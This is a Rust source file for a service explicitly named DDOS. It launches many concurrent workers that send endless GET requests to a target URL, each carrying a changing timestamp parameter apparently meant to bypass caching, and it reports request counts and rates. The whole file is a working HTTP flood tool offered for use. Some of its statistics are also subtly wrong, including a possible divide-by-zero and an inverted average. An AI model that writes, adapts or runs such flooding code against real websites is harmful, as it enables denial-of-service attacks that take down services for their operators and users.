use std::{sync::Arc, sync::{atomic::AtomicUsize, atomic::Ordering}};
use std::sync::Mutex;
use chrono::{DateTime, Utc, Timelike};
use crate::model::ddos::DDOS;
use tokio::sync::broadcast;
use reqwest;

#[derive(Debug, Clone)]
pub struct DDOSService {
    ddos: DDOS,
    total: Arc<AtomicUsize>,
    success: Arc<AtomicUsize>,
    failed: Arc<AtomicUsize>,
    start: DateTime<Utc>,
}

impl DDOSService {
    pub fn new(ddos: DDOS) -> Self {
        DDOSService { 
            ddos: ddos,
            total: Arc::new(AtomicUsize::new(0)), 
            success: Arc::new(AtomicUsize::new(0)),
            failed: Arc::new(AtomicUsize::new(0)),
            start: Utc::now()
        }
    }

    pub async fn run(&self, shutdown_rx: Arc<Mutex<broadcast::Receiver<bool>>>) {
        let mut handles = Vec::new();

        for w in 0..self.ddos.workers_num {
            let url = self.ddos.url.clone();
            let total_reqs = Arc::clone(&self.total);
            let success_reqs = Arc::clone(&self.success);
            let failed_reqs = Arc::clone(&self.failed);

            let shutdown_rx_cloned = Arc::clone(&shutdown_rx);

            let thread = tokio::spawn(async move {
                println!("worker {} was started", w);

                let client = reqwest::Client::new();

                loop {
                    if shutdown_rx_cloned.lock().unwrap().try_recv().unwrap_or(false) {
                        println!("worker {} was stopped", w);
                        return;
                    }

                    match client.get(&format!("{}&ts={}", url, Utc::now().nanosecond())).send().await {
                        Ok(response) => {
                            let status = response.status();

                            if status.is_success() {
                                let bytes = response.bytes().await.unwrap();
                                _ = String::from_utf8_lossy(&bytes);

                                success_reqs.fetch_add(1, Ordering::Relaxed);

                                // println!("{}", json);
                            } else {
                                failed_reqs.fetch_add(1, Ordering::Relaxed);
                                println!("Request failed with status code: {}", status);
                            }
                        }
                        Err(e) => {
                            failed_reqs.fetch_add(1, Ordering::Relaxed);
                            println!("Error: {}", e.to_string());
                        }
                    }

                    total_reqs.fetch_add(1, Ordering::Relaxed);
                }
            });

            handles.push(thread);
        }

        for h in handles {
            tokio::try_join!(h).unwrap();
        }

        let total: usize = self.total.load(Ordering::SeqCst);
        println!("Total reqs: {}", total);

        let success: usize = self.success.load(Ordering::SeqCst);
        println!("Success reqs: {}", success);

        let failed: usize = self.failed.load(Ordering::SeqCst);
        println!("Failed reqs: {}", failed);

        let duration: usize = ((Utc::now().timestamp_millis() - self.start.timestamp_millis()) / 1000) as usize;
        println!("Duration: {}s.", duration);

        let mut avg_total_duration = 0;
        if total != 0 {
            avg_total_duration = duration / total;
        }
        println!("AVG Total: {}", avg_total_duration);

        let mut rps: usize = 0;
        if total > 0 {
            rps = total / duration;
        }

        println!("RPS: {}", rps);
    }
}
